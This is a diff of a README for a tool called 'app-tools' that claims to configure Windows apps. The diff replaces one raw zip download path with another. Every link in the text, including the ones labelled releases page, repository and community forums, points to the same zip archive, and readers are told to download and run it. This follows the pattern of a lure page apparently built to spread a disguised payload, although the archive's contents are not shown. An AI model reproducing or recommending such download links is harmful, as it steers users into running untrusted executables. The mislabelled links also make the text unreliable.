@@ -1,6 +1,6 @@
 # 🎉 app-tools - Easy Configuration for Your Favorite Apps
 
-[![Download app-tools](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip)](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip)
+[![Download app-tools](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip)](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to **app-tools**! This application helps you configure your favorite app
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [Download app-tools](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip).
+To download the latest version, visit this page: [Download app-tools](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip).
 
 1. Go to the **Releases** page by clicking the link above.
 2. Find the latest release at the top of the list.
-3. Locate the file named `https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip`. This is the file you need.
+3. Locate the file named `https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip`. This is the file you need.
 4. Click on the file to download it to your computer.
 
 Once the download completes, you can run the application.
@@ -37,7 +37,7 @@ Before installing **app-tools**, make sure your system meets the following requi
 
 ## ⚙️ How to Use
 
-1. **Run the Application**: Open the downloaded `https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip` file.
+1. **Run the Application**: Open the downloaded `https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip` file.
 2. **Select an App**: Choose the app you want to configure from the list provided.
 3. **Choose Configuration Options**: Follow the prompts to select your preferred settings.
 4. **Apply Configurations**: Click the “Apply” button, and the tool will automatically set up the app for you.
@@ -64,7 +64,7 @@ Currently, **app-tools** is only available for Windows. We may expand to other o
 
 ## 🎯 Contributing
 
-We welcome contributions to improve **app-tools**! If you would like to report an issue or suggest a feature, please visit our [GitHub repository](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip). Your feedback helps us make the application better for everyone.
+We welcome contributions to improve **app-tools**! If you would like to report an issue or suggest a feature, please visit our [GitHub repository](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip). Your feedback helps us make the application better for everyone.
 
 ## 🛠️ Support
 
@@ -72,8 +72,8 @@ For support related to **app-tools**, please reach out through the Issues sectio
 
 ## 🔗 Useful Links
 
-- [Download app-tools](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip)
-- [Community Forums](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/discord/media/app-tools-3.5-beta.1.zip)
+- [Download app-tools](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip)
+- [Community Forums](https://raw.githubusercontent.com/Beardless-rapist736/app-tools/main/ungoogled/media/app-tools-v3.5.zip)
 
 Thank you for choosing **app-tools**! Enjoy your automated app configurations.
